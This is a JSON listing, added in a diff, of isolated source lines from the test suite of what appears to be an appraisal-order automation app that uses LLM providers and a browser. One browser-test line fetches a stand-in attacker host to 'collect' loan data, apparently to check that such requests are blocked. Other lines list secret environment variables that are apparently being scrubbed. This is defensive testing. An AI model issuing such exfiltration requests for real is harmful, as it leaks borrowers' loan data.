@@ -1,0 +1,412 @@
+[
+  {
+    "file": "tests/app.test.ts",
+    "line": 76,
+    "source": "])('passes resolved provider/model from a $provider upload to its isolated job ($model)', async ({ provider, model, expected }) => {"
+  },
+  {
+    "file": "tests/app.test.ts",
+    "line": 81,
+    "source": ".field(fields).attach('urla', pdf, 'urla.pdf').expect(202);"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 100,
+    "source": "] as const;"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 121,
+    "source": "]) {"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 315,
+    "source": "] as const;"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 317,
+    "source": "(['workPhone', 'homePhone', 'mobilePhone'] as const).map((name, index) => {"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 382,
+    "source": "] as const;"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 607,
+    "source": "}, change);"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 647,
+    "source": "]) {"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 718,
+    "source": "fetch('/Orders/Submit?loan=example'),"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 719,
+    "source": "fetch('https://attacker.invalid/collect?loan=example'),"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 720,
+    "source": "fetch('/Orders/States/NV/Counties'),"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 827,
+    "source": "? '1004 SFR FHA' : 'FHA 203(b); Number of Units: 1; Manufactured Home: No' },"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 855,
+    "source": "}, labels);"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 884,
+    "source": "}, labels);"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1036,
+    "source": "}, async (route): Promise<GuardedResponse> => {"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1169,
+    "source": "] as const) {"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1208,
+    "source": "? '<h1>Loading account...</h1><script>setTimeout(()=>{const link=document.createElement(\"a\");link.href=\"#\";link.textContent=\"Log Out\";document.body.append(link)},40)</script>' : loginHtml,"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1308,
+    "source": ": url.pathname === '/Account/PostLogin' ? '/' : url.pathname === '/' ? '/Orders/Search' : undefined;"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1318,
+    "source": "})().catch(() => undefined);"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1330,
+    "source": "'GET https://clients.r3amc.com/Login.aspx',"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1331,
+    "source": "'POST https://clients.r3amc.com/Login.aspx',"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1332,
+    "source": "'GET https://clients.r3amc.com/Account/PostLogin',"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1333,
+    "source": "'GET https://clients.r3amc.com/',"
+  },
+  {
+    "file": "tests/browser.spec.ts",
+    "line": 1334,
+    "source": "'GET https://clients.r3amc.com/Orders/Search',"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 84,
+    "source": "}, input, true);"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 102,
+    "source": "] as const)('explicitly clears sale price for %s when contract supplied is %s', (loanPurpose, hasContract) => {"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 171,
+    "source": "])('approves only the equivalent FHA product labels %s and %s while preserving the stated product', (canonical, alias) => {"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 217,
+    "source": "])('maps explicit property description %s before inferring a product', (propertyType, expectedProperty, expectedProduct) => {"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 340,
+    "source": "] as const) {"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 358,
+    "source": "] as const) {"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 425,
+    "source": "classificationEvidence,"
+  },
+  {
+    "file": "tests/domain.test.ts",
+    "line": 428,
+    "source": "]) {"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 69,
+    "source": "}, 25000);"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 96,
+    "source": "'APPRAISAL_AI_API_KEY', 'GOOGLE_API_KEY', 'GEMINI_API_KEY', 'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_CREDENTIALS',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 97,
+    "source": "'GOOGLE_GENAI_USE_VERTEXAI', 'GOOGLE_CLOUD_PROJECT', 'GCLOUD_PROJECT', 'GOOGLE_CLOUD_LOCATION',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 98,
+    "source": "'GOOGLE_BASE_URL', 'GEMINI_BASE_URL', 'GOOGLE_API_BASE_URL', 'GOOGLE_GENAI_BASE_URL',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 99,
+    "source": "'GOOGLE_GENAI_API_ENDPOINT', 'GOOGLE_VERTEX_AI_ENDPOINT', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 100,
+    "source": "'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'LANGSMITH_API_KEY', 'NODE_OPTIONS',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 101,
+    "source": "'XAI_API_KEY', 'GROK_API_KEY', 'XAI_BASE_URL', 'XAI_API_BASE', 'XAI_API_BASE_URL', 'GROK_BASE_URL',"
+  },
+  {
+    "file": "tests/environment.test.ts",
+    "line": 102,
+    "source": "'XAI_API_HOST', 'XAI_API_ENDPOINT', 'XAI_TRACING', 'XAI_TRACE_API_KEY', 'GROK_API_ENDPOINT',"
+  },
+  {
+    "file": "tests/errors.test.ts",
+    "line": 50,
+    "source": "])('classifies %s from an actual SDK error without exposing its body', (message, code, action) => {"
+  },
+  {
+    "file": "tests/errors.test.ts",
+    "line": 64,
+    "source": "])('recognizes plain, direct and nested SDK shapes', error => {"
+  },
+  {
+    "file": "tests/errors.test.ts",
+    "line": 114,
+    "source": "] as const)('classifies SDK HTTP %s: %s without forwarding private details', (status, message, code, action) => {"
+  },
+  {
+    "file": "tests/errors.test.ts",
+    "line": 194,
+    "source": "] as const)('classifies OpenAI-compatible SDK HTTP %s: %s without exposing its details', (status, message, code, action) => {"
+  },
+  {
+    "file": "tests/extraction-schema.test.ts",
+    "line": 11,
+    "source": "? child.flatMap((item, index) => schemaNodes(item, `${path}.${key}[${index}]`))"
+  },
+  {
+    "file": "tests/extraction-schema.test.ts",
+    "line": 12,
+    "source": ": schemaNodes(child, `${path}.${key}`))];"
+  },
+  {
+    "file": "tests/extraction-schema.test.ts",
+    "line": 53,
+    "source": "'$.properties.loanAmount', '$.properties.salePrice', '$.properties.lastValuationAmount',"
+  },
+  {
+    "file": "tests/extraction.test.ts",
+    "line": 95,
+    "source": ".filter(item => item.type === 'input_text').map(item => String(item.text)).join('\\n');"
+  },
+  {
+    "file": "tests/extraction.test.ts",
+    "line": 113,
+    "source": ".filter(item => item.type === 'input_text').map(item => String(item.text)).join('\\n');"
+  },
+  {
+    "file": "tests/extraction.test.ts",
+    "line": 181,
+    "source": "new HumanMessage('Inspect the order page.'),"
+  },
+  {
+    "file": "tests/frontend.spec.ts",
+    "line": 29,
+    "source": "}).catch(() => response.writeHead(500).end());"
+  },
+  {
+    "file": "tests/google.test.ts",
+    "line": 112,
+    "source": "] as const) {"
+  },
+  {
+    "file": "tests/google.test.ts",
+    "line": 180,
+    "source": "])('locally rejects $name despite a successful native JSON response', async ({ data }) => {"
+  },
+  {
+    "file": "tests/google.test.ts",
+    "line": 213,
+    "source": "])('does not retry output formats or reroute after HTTP $status: $message', async ({ status, message }) => {"
+  },
+  {
+    "file": "tests/google.test.ts",
+    "line": 249,
+    "source": ".flatMap(content => content.parts).filter(part => part.functionCall);"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 179,
+    "source": "'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'APPRAISAL_AI_API_KEY', 'R3_PASSWORD', 'LANGSMITH_API_KEY',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 180,
+    "source": "'GOOGLE_API_KEY', 'GEMINI_API_KEY', 'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_CREDENTIALS', 'GOOGLE_GENAI_USE_VERTEXAI',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 181,
+    "source": "'GOOGLE_CLOUD_PROJECT', 'GCLOUD_PROJECT', 'GOOGLE_CLOUD_LOCATION', 'GOOGLE_BASE_URL', 'GEMINI_BASE_URL',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 182,
+    "source": "'GOOGLE_API_BASE_URL', 'GOOGLE_GENAI_BASE_URL', 'GOOGLE_GENAI_API_ENDPOINT', 'GOOGLE_VERTEX_AI_ENDPOINT',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 183,
+    "source": "'XAI_API_KEY', 'GROK_API_KEY', 'XAI_BASE_URL', 'XAI_API_BASE', 'XAI_API_BASE_URL', 'GROK_BASE_URL',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 184,
+    "source": "'XAI_API_HOST', 'XAI_API_ENDPOINT', 'XAI_TRACING', 'XAI_TRACE_API_KEY', 'GROK_API_ENDPOINT',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 185,
+    "source": "'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NODE_OPTIONS',"
+  },
+  {
+    "file": "tests/jobs.test.ts",
+    "line": 186,
+    "source": "].flatMap(name => [name, name.toLowerCase()]);"
+  },
+  {
+    "file": "tests/model-messages.test.ts",
+    "line": 58,
+    "source": "screenshotMessage(JSON.stringify(screenshot)),"
+  },
+  {
+    "file": "tests/pdf-pages.test.ts",
+    "line": 71,
+    "source": "'Source document: urla.pdf. Page 1 of 2. The following image is this PDF page.',"
+  },
+  {
+    "file": "tests/pdf-pages.test.ts",
+    "line": 72,
+    "source": "'Source document: urla.pdf. Page 2 of 2. The following image is this PDF page.',"
+  },
+  {
+    "file": "tests/pdf-pages.test.ts",
+    "line": 73,
+    "source": "'Source document: sales-contract.pdf. Page 1 of 1. The following image is this PDF page.',"
+  },
+  {
+    "file": "tests/pdf-pages.test.ts",
+    "line": 105,
+    "source": "])('rejects $name with an actionable error and destroys its loader', async ({ buffer, code }) => {"
+  },
+  {
+    "file": "tests/preparation.test.ts",
+    "line": 211,
+    "source": "])('reports a useful Anthropic rejection and cleans up before browser creation: %s', async (message, expected) => {"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 155,
+    "source": ": body.input!.flatMap(message => Array.isArray(message.content) ? message.content as Array<Record<string, unknown>> : []);"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 202,
+    "source": "])('rejects malformed Anthropic $caseName before browser planning', async ({ data }) => {"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 210,
+    "source": "'Your credit balance is too low to access the Anthropic API.',"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 211,
+    "source": "'Schema is too complex for compilation.',"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 212,
+    "source": "])('does not retry output formats after an Anthropic 400 rejection: %s', async message => {"
+  },
+  {
+    "file": "tests/providers.test.ts",
+    "line": 231,
+    "source": ": openaiResponse());"
+  },
+  {
+    "file": "tests/r3-fields.test.ts",
+    "line": 26,
+    "source": "])('rejects a different section, known other contact, or unsafe control: %j', change => {"
+  },
+  {
+    "file": "tests/r3-fields.test.ts",
+    "line": 43,
+    "source": ".flatMap(section => ['workPhone', 'homePhone', 'mobilePhone'].map(field => `${section}.${field}`));"
+  },
+  {
+    "file": "tests/xai.test.ts",
+    "line": 58,
+    "source": ".map(([key, child]) => [key, schemaMeaning(child, root)]));"
+  },
+  {
+    "file": "tests/xai.test.ts",
+    "line": 90,
+    "source": "], signal);"
+  },
+  {
+    "file": "tests/xai.test.ts",
+    "line": 127,
+    "source": ": completion(null, [call('appraisal_document_data', 'extract', extracted)]);"
+  },
+  {
+    "file": "tests/xai.test.ts",
+    "line": 144,
+    "source": "&& request.body.model === documents.input.model && request.body.response_format?.type === 'json_schema' && !request.body.tools)).toBe(true);"
+  }
+]
